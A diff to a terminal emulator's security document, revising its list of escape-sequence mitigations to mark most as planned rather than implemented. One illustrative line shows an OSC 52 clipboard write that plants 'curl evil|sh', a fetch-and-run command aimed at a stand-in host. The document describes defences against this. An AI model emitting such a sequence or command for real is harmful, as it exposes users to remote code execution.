@@ -24,34 +24,45 @@ This document explains:
 
 ## What we defend against
 
-The terminal core implements the following mandatory mitigations:
+The terminal core will implement the mandatory mitigations below. Each
+bullet is annotated with its implementation status as of `main` at
+Stage 3b — none of these protections are in code yet beyond the
+`bInheritHandles = FALSE` guarantee that ConPTY itself enforces. The
+list is the *target* trust model; track each via the corresponding
+stage in [`spec/tech-plan.md`](spec/tech-plan.md).
 
-- **No response-generating sequences.** DSR (`CSI n`), DA1/DA2/DA3,
+- **No response-generating sequences.** *(planned, stage TBD as part of
+  the Stage 2+ parser hardening pass.)* DSR (`CSI n`), DA1/DA2/DA3,
   DECRQM, DECRQSS, cursor-position report, title report (`CSI 21 t`),
-  and font-size reports are parsed and **dropped**. Background:
+  and font-size reports will be parsed and **dropped**. Background:
   CVE-2003-0063, CVE-2022-45872, CVE-2024-50349/52005.
-- **No clipboard write from the child.** OSC 52 set-selection is
-  ignored. A child writing `\x1b]52;c;<base64 with newline>curl evil|sh\x07`
-  must not be one paste away from RCE.
-- **OSC 0/2 window title sanitisation.** Control characters and
-  embedded escapes are stripped before any UIA exposure or window
-  title set; titles are truncated to 256 bytes. Background:
-  CVE-2022-44702.
-- **OSC 8 hyperlink scheme allowlist.** Only `http`, `https`, and
-  `file` schemes are exposed to UIA's Hyperlink pattern. `javascript:`,
-  `data:`, custom URI schemes are dropped silently.
-- **Control-character stripping in `displayString`.** Everything passed
-  to `UiaRaiseNotificationEvent` has C0 / C1 / DEL stripped first, so
-  NVDA never verbalises "escape bracket one A".
-- **Output rate limiting.** Output ingestion is capped at ~10 MB/s to
-  defeat ANSI-bomb DoS that targets the screen reader rather than the
-  CPU.
-- **Process isolation.** The child runs in a Windows Job Object with
-  `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`. Pipe handles are not inherited
-  (`bInheritHandles = FALSE`); ConPTY duplicates them via the attribute
-  list. We never run elevated with an unelevated child.
+- **No clipboard write from the child.** *(planned, parser-hardening
+  pass.)* OSC 52 set-selection will be ignored. A child writing
+  `\x1b]52;c;<base64 with newline>curl evil|sh\x07` must not be one
+  paste away from RCE.
+- **OSC 0/2 window title sanitisation.** *(planned, parser-hardening
+  pass.)* Control characters and embedded escapes will be stripped
+  before any UIA exposure or window title set; titles truncated to 256
+  bytes. Background: CVE-2022-44702.
+- **OSC 8 hyperlink scheme allowlist.** *(planned alongside the OSC 8
+  UIA Hyperlink-pattern surface, Stage 4+.)* Only `http`, `https`, and
+  `file` schemes will be exposed; `javascript:`, `data:`, custom URI
+  schemes dropped silently.
+- **Control-character stripping in `displayString`.** *(planned with
+  Stage 5 streaming notifications.)* Everything passed to
+  `UiaRaiseNotificationEvent` will have C0 / C1 / DEL stripped first.
+- **Output rate limiting.** *(planned with Stage 5.)* Output ingestion
+  capped at ~10 MB/s to defeat ANSI-bomb DoS targeting the screen
+  reader rather than the CPU.
+- **Process isolation.** *(partial, Stage 1.)* Pipe handles are not
+  inherited (`bInheritHandles = FALSE`); ConPTY duplicates them via
+  the attribute list — implemented today. **Job Object lifecycle
+  (`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`) was deferred from Stage 1**;
+  see [`docs/CONPTY-NOTES.md`](docs/CONPTY-NOTES.md). The "we never
+  run elevated with an unelevated child" guarantee is also future
+  work; until enforced in code, do not run pty-speak elevated.
 
-The full mitigation matrix lives in `Terminal.VtParser` and is
+The full mitigation matrix will live in `Terminal.Parser` and be
 covered by parser-level unit tests. PRs that disable any of the above
 must justify the change in the PR description and update this document.
 
@@ -66,7 +77,8 @@ We do not defend against:
   stolen we revoke and reissue.
 - Side-channel attacks on the host system.
 - Vulnerabilities in third-party child processes (Claude Code, npm,
-  pip, etc.). We isolate them in a Job Object; we don't audit them.
+  pip, etc.). Once Job Object isolation lands we cap their lifetime
+  to the parent's; we never audit their code.
 
 ## Release signing and verification
 
